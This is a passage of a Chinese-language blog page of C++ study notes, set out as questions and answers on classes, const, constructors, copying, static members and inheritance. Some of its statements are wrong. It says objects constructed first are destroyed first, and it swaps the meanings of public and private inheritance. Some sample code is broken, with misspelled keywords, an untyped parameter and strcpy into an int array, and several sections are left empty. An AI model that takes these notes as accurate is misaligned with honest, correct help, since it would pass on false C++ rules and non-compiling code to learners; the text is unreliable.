class="comment">;</span></span><br><span class="line">int &amp;<span class="keyword">b </span>= a<span class="comment">;</span></span><br></pre></td></tr></table></figure></blockquote></blockquote></li><li><blockquote><p>ATTENTION:由于引用不是独立的变量，编译系统给它单独分配储存单元，因此，在建立引用时只有声明没有定义，只是声明它和原有某一变量的关系。</p></blockquote></li></ul><hr><h4 id="为什么要使用inline函数？"><a href="#为什么要使用inline函数？" class="headerlink" title="为什么要使用inline函数？"></a>为什么要使用inline函数？</h4><ul><li><blockquote><p>为了<strong>提高效率</strong>。</p></blockquote></li><li><blockquote><p>调用函数时需要一定的时间，如果有些函数需要频繁使用，则累计所用时间会很长，从而降低程序的执行效率。<br>c++提供一种提高效率的方法，即在编译时，将所调用函数的代码嵌入到主调函数中。这种嵌入到主调函数中的函数称为<strong>内联函数</strong>。</p></blockquote></li></ul><hr><h4 id="作用域限定符“-”的作用是什么"><a href="#作用域限定符“-”的作用是什么" class="headerlink" title="作用域限定符“::”的作用是什么"></a>作用域限定符“::”的作用是什么</h4><ul><li><blockquote><p>在c++中，不同作用域内声明的变量可以同名，当局部变量和全局变量同名时，在局部变量中引用全局变量用到作用域限定符“<strong>::</strong>”。<br>当全局变量和局部变量名字相同，重载时，就规定：<br>用 “<strong>:: + 全局变量名</strong>” 来称呼全局变量。</p></blockquote></li></ul><hr><h3 id="二、类和对象"><a href="#二、类和对象" class="headerlink" title="二、类和对象"></a><font color="DarkViolet"><center>二、类和对象</center></font></h3><hr><p><strong><font size="6" color="OrangeRed"><center>程序 = 对象 + 对象</center></font></strong><br><strong><font size="6" color="OrangeRed"><center>对象 = 算法 + 数据结构</center></font></strong></p><hr><h4 id="什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？"><a href="#什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？" class="headerlink" title="什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？"></a>什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？</h4><ul><li><strong>对象</strong>：<blockquote><p>客观世界中任何一个事物都可以看成一个<strong>对象</strong>（object）。</p></blockquote></li><li><strong>类</strong>：<blockquote><p>类是所有面向对象语言的共同特征，所有面向对象的语言都提供了这种类型。</p></blockquote></li><li><strong>抽象</strong>：<blockquote><p><strong>类</strong>是<strong>对象</strong>的抽象，而对象是类的具体实例。</p></blockquote></li><li><strong>数据抽象</strong>: <blockquote><p>只向外界提供关键信息，并隐藏其后台的实现细节，即只表现必要的信息而不呈现细节。数据抽象是一种依赖于接口和实现分离的编程（设计）技术。</p></blockquote></li><li><p><strong>类的声明</strong>：</p><blockquote></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">class</span> 类名 &#123;</span><br><span class="line"><span class="attribute">private</span>:</span><br><span class="line">私有的数据和成员函数;</span><br><span class="line"><span class="attribute">public</span>:</span><br><span class="line">公用的数据和成员函数;</span><br><span class="line"><span class="attribute">protected</span>:</span><br><span class="line">受保护的数据和成员函数;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>类的定义</strong>：</p><blockquote></blockquote><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1、先声明，后定义：</span></span><br><span class="line"><span class="comment">//(1)、</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 类名 对象名1,<span class="type">对象名2</span>,<span class="type">...;</span></span></span><br><span class="line"><span class="comment">//(2)、</span></span><br><span class="line">类名 对象名<span class="number">1</span>,对象名<span class="number">2</span>,...;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、声明同时定义：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 类名 </span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">私有的数据和成员函数;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">公用的数据和成员函数;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">受保护的数据和成员函数;</span><br><span class="line">&#125;对象名<span class="number">1</span>,对象名<span class="number">2</span>,...;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、不出现类名直接定义对象（非常 不建议 使用）：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">私有的数据和成员函数;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">公用的数据和成员函数;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">受保护的数据和成员函数;</span><br><span class="line">&#125;对象名<span class="number">1</span>,对象名<span class="number">2</span>,...;</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="c-中有哪些权限限定符？各起什么作用？"><a href="#c-中有哪些权限限定符？各起什么作用？" class="headerlink" title="c++中有哪些权限限定符？各起什么作用？"></a>c++中有哪些权限限定符？各起什么作用？</h4><ul><li><strong>private</strong><blockquote><p>private将成员声明为<strong>私有成员</strong>，只能被<strong>本类中的成员函数</strong>引用，类外不能调用（友元类除外）。</p></blockquote></li><li><strong>public</strong><blockquote><p>public将成员声明为<strong>公有成员</strong>，既可以被<strong>本类成员函数</strong>所引用，也可以被<strong>类的作用域内的其他函数</strong>所引用。</p></blockquote></li><li><strong>protected</strong><blockquote><p>protected将成员声明为<strong>受保护成员</strong>，不能被类外访问，但是可以被<strong>派生类的成员函数</strong>访问。</p></blockquote></li></ul><hr><h4 id="什么是类的封装？封装的原则是什么？"><a href="#什么是类的封装？封装的原则是什么？" class="headerlink" title="什么是类的封装？封装的原则是什么？"></a>什么是类的封装？封装的原则是什么？</h4><ul><li><strong>1、什么是封装？</strong><blockquote><p><strong>封装</strong>可以隐藏实现细节，使代码模块化。<br><strong>封装</strong>是把过程和数据包围起来，对数据的访问只能通过已定义的界面。<br>在面向对象编程上可理解为：把客观事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏。</p></blockquote></li><li><strong>2、封装的原则是什么？</strong><blockquote><p><strong>简化用户接口，隐藏实现细节，这个是封装的根本目的。</strong><br>封装的难点在于如何设计接口。<br><strong>其一</strong>：必须保证接口是功能的全集，即接口能够覆盖所有需求。不能完成必要功能的封装是没有意义的。<br><strong>其二</strong>：尽量使接口是最小冗余的。这是为了简化类使用者的学习和使用，难用的接口是最容易让人遗忘的。冗余接口的存在是被允许的，但必须保证冗余接口是有效的。也就是说，增加冗余接口会带来很大的好处，比如性能的飞升。<br><strong>其三</strong>：要保证接口是稳定的，将接口和实现分离，并将实现隐藏，就是为了能保护类使用者在类的实现细节改变的情况下，不必随时修改。一旦接口被公布，永远也不要改变它。</p></blockquote></li></ul><hr><h4 id="同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？"><a href="#同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？" class="headerlink" title="同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？"></a>同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？</h4><ul><li><blockquote><p><strong>是同一段代码</strong>。</p></blockquote></li><li><blockquote><p><strong>通过this指针</strong>：每一个成员函数中都包括这个指针的名字是固定的，称为this。<strong>它是指向对象的指针，他的值是当前被调用的成员函数所在的对象的起始地址</strong>。<br>例：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> Box::volume()&#123;</span><br><span class="line">    <span class="built_in">return</span> (<span class="built_in">height</span> * <span class="built_in">width</span> * length);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//C++把它处理为:</span></span><br><span class="line"><span class="keyword">int</span> Box::volume(Box * <span class="keyword">this</span>)&#123;</span><br><span class="line">    <span class="built_in">return</span> (<span class="keyword">this</span>-&gt;<span class="built_in">height</span> * <span class="keyword">this</span>-&gt;<span class="built_in">width</span> * <span class="keyword">this</span>-&gt;length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote></li></ul><hr><h4 id="类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？"><a href="#类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？" class="headerlink" title="类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？"></a>类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？</h4><ul><li><blockquote><p><strong>区别</strong>1：静态成员函数实际上是一个全局函数,不依赖一个类的对象. 而属于类，不创建对象也可调用，静态成员函数没有this指针。普通成员函数依赖一个类的对象,也就是它有一个隐藏的调用参数（this）指针,必须指向一个类的对象。</p></blockquote></li><li><blockquote><p><strong>区别2</strong>：静态函数只能访问类中的静态成员变量；</p></blockquote></li><li><blockquote><p><strong>区别3</strong>：如果成员函数想作为回调函数来使用，如创建线程等，一般只能将它定义为静态成员函数才行。</p></blockquote></li></ul><hr><h3 id="三、类和对象的进一步讨论"><a href="#三、类和对象的进一步讨论" class="headerlink" title="三、类和对象的进一步讨论"></a><font color="DarkViolet"><center>三、类和对象的进一步讨论</center></font></h3><hr><h4 id="构造函数、析构函数的英文单词是什么？"><a href="#构造函数、析构函数的英文单词是什么？" class="headerlink" title="构造函数、析构函数的英文单词是什么？"></a>构造函数、析构函数的英文单词是什么？</h4><ul><li><blockquote><p><strong>构造函数——constructor</strong></p></blockquote></li><li><blockquote><p><strong>析构函数——destructor</strong></p></blockquote></li></ul><hr><h4 id="构造函数的特点是什么？析构函数的特点是什么？"><a href="#构造函数的特点是什么？析构函数的特点是什么？" class="headerlink" title="构造函数的特点是什么？析构函数的特点是什么？"></a>构造函数的特点是什么？析构函数的特点是什么？</h4><ul><li><blockquote><p>c++提供构造函数，来处理对象的初始化。构造函数是一种<strong>特殊的成员函数</strong>，与其他成员函数不同，不需要用户来调用它，而是在建立对象时自动执行。构造函数只是起初始化值的作用，但实例化一个对象的时候，可以通过实例去传递参数，从主函数传递到其他的函数里面，这样就使其他的函数里面有值了。规则，只要你一实例化对象，系统自动回调用一个构造函数，就算不写，编译器也自动调用一次。</p></blockquote></li><li><blockquote><p>析构函数与构造函数同名，但该函数前面加~。析构函数<strong>没有参数</strong>，也<strong>没有返回值</strong>，而且<strong>不能重载</strong>，在<strong>一个类中只能有一个析构函数</strong>。当<strong>撤销对象时，编译器也会自动调用析构函数</strong>。<strong>每一个类必须有一个析构函数</strong>，用户可以自定义析构函数，也可以是编译器自动生成默认的析构函数。一般析构函数定义为类的公有成员。</p></blockquote></li></ul><hr><h4 id="构造函数、析构函数的执行顺序是什么？"><a href="#构造函数、析构函数的执行顺序是什么？" class="headerlink" title="构造函数、析构函数的执行顺序是什么？"></a>构造函数、析构函数的执行顺序是什么？</h4><ul><li><blockquote><p><strong>先构造的先执行析构</strong>。</p></blockquote></li></ul><hr><h4 id="在C语言中，我们说main-函数是程序的入口，是最先被调用的函数，在C-中情况是这样吗？如果不是请说明原因，并举出实例。"><a href="#在C语言中，我们说main-函数是程序的入口，是最先被调用的函数，在C-中情况是这样吗？如果不是请说明原因，并举出实例。" class="headerlink" title="在C语言中，我们说main()函数是程序的入口，是最先被调用的函数，在C++中情况是这样吗？如果不是请说明原因，并举出实例。"></a>在C语言中，我们说main()函数是程序的入口，是最先被调用的函数，在C++中情况是这样吗？如果不是请说明原因，并举出实例。</h4><ul><li><blockquote><p><strong>c++中不是这样</strong>。</p></blockquote></li><li><blockquote><p>因为存在构造数据类型的定义对象定义，且对象为全局对象的话，则该类对象所属的构造类型的构造函数在main()函数之前执行。</p></blockquote></li></ul><hr><h4 id="const关键字"><a href="#const关键字" class="headerlink" title="const关键字"></a>const关键字</h4><center><strong><font color="Crimson" size="6">const在c++中要尽可能的使用</font></strong></center><style>table th:first-of-type {width:30%;}</style><table><thead><tr><th style="text-align:center">形式</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"><code>Time const t1;</code></td><td style="text-align:center">t1是常对象，其值在任何情况下都不能改变</td></tr><tr><td style="text-align:center"><code>void Time::fun()const;</code></td><td style="text-align:center">fun是Time类中的成员函数，可以引用，但不能修改本类中的成员数据</td></tr><tr><td style="text-align:center"><code>Time * const p;</code></td><td style="text-align:center">p是指向time类对象的常指针变量，p的值（p的指向）不能改变</td></tr><tr><td style="text-align:center"><code>const Time * p;</code></td><td style="text-align:center">p是指向Time类常对象的指针变量，p指向的类对象的值不能通过p来改变</td></tr><tr><td style="text-align:center"><code>const Time &amp;t1 = t;</code></td><td style="text-align:center">t1是Time类对象t的引用，二者指向同一储存空间，t的值不能改变</td></tr></tbody></table><ul><li><blockquote><p>const的作用是：<strong>数据的保护</strong></p></blockquote></li><li>常成员变量<blockquote><p>类的常成员变量是用const关键字声明的成员变量，<strong>其值不可改变</strong>，它的<strong>初始值必须通过构造函数的初始化列表方式完成</strong>。一般将一个类中不可改变的值声明为常成员变量。<br>但const成员变量有一个缺点：该类的所有对象都会const成员变量，而不是整个类共用一个。这种情况下，const常和static一起使用。</p></blockquote></li><li>const成员函数<blockquote><p>const成员函数语法为：<code>int Obj::Func const;</code>这表明成员函数Func const是个常成员函数，它的作用是表明<strong>只能引用类中的数据成员</strong>，而<strong>不能修改类中的数据成员</strong>。</p></blockquote></li><li>常对象<blockquote><p>语法为：<code>const obj o(10);</code> 或 <code>obj const o(10);</code><br>用const声明的对象为常对象，常对象必须初始化，<br>如果一个对象被声明为const对象，则该对象的数据成员不可修改。即const对象不能调用该对象的非const成员函数。</p></blockquote></li><li>指向const数据的指针<blockquote><p>定义指针时，在指针的类型<strong>前面</strong>加上const表明该指针指向的对象是个常量。</p></blockquote></li><li>const指针<blockquote><p>在定义指针时，在指针的<strong>前面</strong>加上const表明该指针是一个常量，它必须被初始化。</p></blockquote></li><li>const在参数中的使用<blockquote><p>const在参数类型为指针或引用时经常被使用，这表明这个指针或引用所指向的数据不允许被修改，这样就保证了在被调函数中不能因为误操作而改变了主调函数中的值。</p></blockquote></li></ul><hr><h4 id="初始化列表的语法是怎样的？"><a href="#初始化列表的语法是怎样的？" class="headerlink" title="初始化列表的语法是怎样的？"></a>初始化列表的语法是怎样的？</h4><ul><li>如下：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">类名::构造函数名([参数表])[:成员初始化表]&#123;</span><br><span class="line">[构造函数体]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//例：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Student(<span class="keyword">int</span> n, <span class="keyword">char</span> s, nam[]):num(n), sex(s)&#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(name, nam);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">char</span> sex;</span><br><span class="line">    <span class="keyword">int</span> name[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="在C-中为什么使用new-delete，而不是malloc-free-来来动态创建对象？如何使用new-delete来动态创建数组？"><a href="#在C-中为什么使用new-delete，而不是malloc-free-来来动态创建对象？如何使用new-delete来动态创建数组？" class="headerlink" title="在C++中为什么使用new/delete，而不是malloc()/free()来来动态创建对象？如何使用new/delete来动态创建数组？"></a>在C++中为什么使用new/delete，而不是malloc()/free()来来动态创建对象？如何使用new/delete来动态创建数组？</h4><ul><li><blockquote><p>c语言中使用库函数malloc()和free()来动态申请和释放内存空间，但是存在两个问题：<br>1、分配的大小需人为计算;<br>2、只分配空间，而不涉及类型。<br>c++使用了运算符new和delete来取代malloc()和free()函数。<strong>动态分配/释放内存</strong>。</p></blockquote></li><li>例：动态创建一维数组<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="comment">//动态分配一维数组</span></span><br><span class="line">    <span class="keyword">int</span> *arr = <span class="keyword">new</span> <span class="keyword">int</span> [n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; arr[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    <span class="comment">//释放arr数组</span></span><br><span class="line">    <span class="keyword">delete</span>[] arr;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="什么是对象的复制？什么是对象的赋值？"><a href="#什么是对象的复制？什么是对象的赋值？" class="headerlink" title="什么是对象的复制？什么是对象的赋值？"></a>什么是对象的复制？什么是对象的赋值？</h4><ul><li>对象的赋值<blockquote><p>一般形式：<code>对象名1 = 对象名2；</code><br><strong>对象的赋值只是用赋值号右边的对象的数据覆盖了赋值号左边的的对象的数据成员</strong>。因此必须使用有默认参数值的构造函数，以保证左值能被初始化。</p></blockquote></li><li>对象的复制<blockquote><p>一般形式：<code>类名 对象2(对象1)；</code> 或 `类名 对象2 = 对象1;<br>例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line">pubilc:</span><br><span class="line">    Student ()&#123;m_strName=<span class="string">"Jim"</span>;&#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    默认的拷贝构造函数：</span></span><br><span class="line"><span class="comment">    Student (const Student &amp;stu)&#123;&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    Student(<span class="keyword">const</span> Student &amp;stu)&#123;m_strName = stu.m_strName;&#125;</span><br><span class="line">    <span class="comment">//显性定义的拷贝构造函数</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">string</span> m_strName;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Student stu1;</span><br><span class="line">    Student stu2 = stu1;</span><br><span class="line">    <span class="function">Student <span class="title">stu3</span><span class="params">(stu1)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote></li></ul><hr><h4 id="什么是深拷贝-浅拷贝？-拷贝构造函数的语法如何？"><a href="#什么是深拷贝-浅拷贝？-拷贝构造函数的语法如何？" class="headerlink" title="什么是深拷贝/浅拷贝？ 拷贝构造函数的语法如何？"></a>什么是深拷贝/浅拷贝？ 拷贝构造函数的语法如何？</h4><ul><li>浅拷贝<blockquote><p>对象拷贝时，仅仅是简单的值拷贝，这称为“浅拷贝”，这是系统默认的拷贝模式，不需要编程实现。</p></blockquote></li><li>深拷贝<blockquote><p>对象拷贝时，对堆中的数据编程进行拷贝，这称为“深拷贝”，这种拷贝模式需要编程实现。</p></blockquote></li><li><strong>拷贝构造函数</strong><blockquote><p>拷贝构造函数中只有哟个参数，为本类对象的一个引用，并通常使用const修饰。<br>语法：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj(<span class="keyword">const</span> obj &amp;o)&#123;</span><br><span class="line">    <span class="literal">no</span> = o.<span class="literal">no</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">"copy constructor"</span> &lt;&lt; <span class="literal">no</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote></li></ul><hr><h4 id="static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？"><a href="#static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？" class="headerlink" title="static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？"></a>static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？</h4><ul><li><blockquote><p><strong>static数据成员</strong>拥有一块单独的储存区（不再类对象内部），不管该类创造了多少个对象。所有该类的对象共享这块区域，这就为这些类之间提供了一种相互通信的方法，并且它不会占据对象的储存空间。他的名字是属于类的（例：Circle::PI），这样可以很大程度上解决全局数据的名字冲突问题。它是有权限控制的，也就是说他可以是private的。</p></blockquote></li><li><blockquote><p>除了数据成员能定义为static的，成员函数也可以定义为static的。与static数据成员一样，static成员函数也是属于类的，而不是属于对象的。static成员函数是属于类的，所以它没有this指针，不创建对象就可以被调用。它的这个特点决定了<strong>static成员函数只能访问类中的static数据成员和static成员函数</strong>。与类的static数据成员一样，<strong>推荐使用类方式引用类的static成员函数</strong>。</p></blockquote></li><li><blockquote><p>在类内提供的仅仅是static数据成员的声明（编译器没有给它分配空间），而不是定义，所以不能使用构造函数对其进行初始化，<strong>static数据成员的初始化必须在类外完成</strong>。static数据成员在使用时，既可以使用对象方式引用，也可以使用类方式引用，通常使用类方式引用，以表明它是一个static数据成员。</p></blockquote></li></ul><hr><h4 id="为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？"><a href="#为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？" class="headerlink" title="为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？"></a>为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？</h4><ul><li><blockquote><p>友元机制可以带来一些便利。</p></blockquote></li><li><blockquote><p>友元可以实现在类的外部访问一个类的<strong>private成员</strong></p></blockquote></li><li><blockquote><p>友元机制虽然可以带来一些便利，但是它严重破坏了程序的封装性，也有影响程序的可读性，所以要<strong>慎重使用友元</strong>。</p></blockquote></li></ul><hr><h3 id="四、运算符重载"><a href="#四、运算符重载" class="headerlink" title="四、运算符重载"></a><font color="DarkViolet"><center>四、运算符重载</center></font></h3><hr><h4 id="在C-中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？"><a href="#在C-中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？" class="headerlink" title="在C++中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？"></a><a href="https://blog.csdn.net/u013982161/article/details/52830143" target="_blank" rel="noopener">在C++中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？</a></h4><hr><h3 id="五、继承和派生"><a href="#五、继承和派生" class="headerlink" title="五、继承和派生"></a><font color="DarkViolet"><center>五、继承和派生</center></font></h3><hr><h4 id="继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？"><a href="#继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？" class="headerlink" title="继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？"></a>继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？</h4><ul><li><blockquote><p><strong>继承——inheritance</strong>。继承就是在已有类的基础上建立一个新类的过程。其中已经存在的类称为基类（base class），新建立的类称为派生类（derived class），从基类产生派生类的过程称为派生。</p></blockquote></li><li><blockquote><p><strong>继承的语法</strong>：</p>  <figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 派生类名: <span class="type">[继承方式] 基类名 &#123;</span></span></span><br><span class="line">    <span class="comment">//继承方式不写默认是private。</span></span><br><span class="line">    派生类新增加的成员</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote></li><li><blockquote><p><strong>继承方式限定</strong>：<br>  <strong>private</strong>：基类的公有成员和保护成员在派生类中保持原有访问属性，其私有成员仍为基类私有。<br>  <strong>public</strong>：积累的公有成员和保护成员在派生类中成了私有成员，其私有成员仍为基类私有。<br>  <strong>protected</strong>：积累的公有成员和保护成员在派生类中成了保护成员，其私有成员仍为基类私有。</p></blockquote></li></ul><hr><h4 id="继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？"><a href="#继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？" class="headerlink" title="继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？"></a>继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？</h4><ul><li><blockquote></blockquote></li></ul><hr><h4 id="继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。"><a href="#继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。" class="headerlink" title="继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。"></a>继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。</h4><ul><li><blockquote><p><strong>派生类要无条件的接收基类中的全部成员</strong>。</p></blockquote></li><li><blockquote><p>派生类尽管拥有基类的所有的成员，但是<strong>派生类不能访问基类private的成员</strong>。</p></blockquote></li></ul><hr><p><font size="5" color="Orangered"><strong><center>派生类从基类中继承的成员在不同的继承方式下的访问权限</center></strong></font></p><center><img src="https://i.imgur.com/v47rxcC.png" alt=""></center><hr><h4 id="组合（子对象）的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？"><a href="#组合（子对象）的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？" class="headerlink" title="组合（子对象）的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？"></a>组合（子对象）的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？</h4><ul><li><blockquote><p>子对象就是类对象中内嵌的对象。当派生类中存在子对象时，派生类的构造函数需要依次完成以下3部分：<br>1、先调用基类构造函数初始化基类数据。<br>2、再调用子对象的构造函数初始化子对象中的数据。<br>3、最后初始化自己的数据成员。</p></blockquote></li></ul><hr><h4 id="当继承和组合都存在时，构造和析构的顺序如何？"><a href="#当继承和组合都存在时，构造和析构的顺序如何？" class="headerlink" title="当继承和组合都存在时，构造和析构的顺序如何？"></a>当继承和组合都存在时，构造和析构的顺序如何？</h4><hr><h4 id="哪些地方必须使用初始化列表？"><a href="#哪些地方必须使用初始化列表？" class="headerlink" title="哪些地方必须使用初始化列表？"></a>哪些地方必须使用初始化列表？</h4><hr><h4 id="什么是overriding、overload？什么是upcasting？"><a href="#什么是overriding、overload？什么是upcasting？" class="headerlink" title="什么是overriding、overload？什么是upcasting？"></a>什么是overriding、overload？什么是upcasting？</h4><hr><h4 